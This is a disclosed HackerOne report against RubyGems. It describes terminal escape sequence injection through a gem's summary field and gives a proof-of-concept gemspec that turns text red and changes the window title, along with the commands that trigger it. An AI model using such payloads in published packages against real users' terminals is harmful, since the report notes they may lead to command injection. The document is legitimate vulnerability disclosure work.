# Escape sequence injection in "summary" field

## Report Details
- **Report ID**: 226335
- **URL**: https://hackerone.com/reports/226335
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-05T13:35:48.312Z
- **Disclosed**: 2017-08-30T23:20:55.044Z

## Reporter
- **Username**: mame
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
Seems we can include any escape sequence in the "summary" field of gemspec.  This allows attackers to inject escape sequences to a victim's terminal emulator.

## How to attack

1) An attacker creates a gem with summary string that includes malicious escape sequences, and push it to rubygems.org.
2) A victim executes `gem search attackers-gem -d`, and the malicious string is printed in the terminal emulator.

In general, this is considered vulnerable.  I'd like you to read [Terminal Emulator Security Issues](http://marc.info/?l=bugtraq&m=104612710031920&w=2) in detail.  In short, an attacker can exploit this, not only to surprise a victim with a rainbow string, but also to inject malicious command to a victim's terminal, which may lead to abitrary code execution.  Ruby WEBrick also handled a similar issue as [a vulnerability](https://www.ruby-lang.org/en/news/2010/01/10/webrick-escape-sequence-injection/).


## Proof of concept

1) Prepare the following gemspec.

~~~
Gem::Specification.new do |spec|
  spec.name     = "escape-sequence-injection-vulnerability"
  spec.version  = "0.0.1"
  spec.authors  = ["Yusuke Endoh"]
  spec.email    = ["mame@ruby-lang.org"]
  spec.summary  = "foo\e[31mbar\e[0mbaz \e]2;BOOM!\a"
  spec.homepage = "http://example.com/"
  spec.license  = "MIT"
end
~~~

2) Run the following commands

~~~
gem build escape-sequence-injection-vulnerability.gemspec
gem install escape-sequence-injection-vulnerability-0.0.1.gem
~~~

3) Run the following command.

~~~
gem query escape-sequence-injection-vulnerability -d && sleep 10
~~~

You will see a summary line "foobarbaz" (with "bar" red), and its window title changed "BOOM!".

## Attachments
No attachments
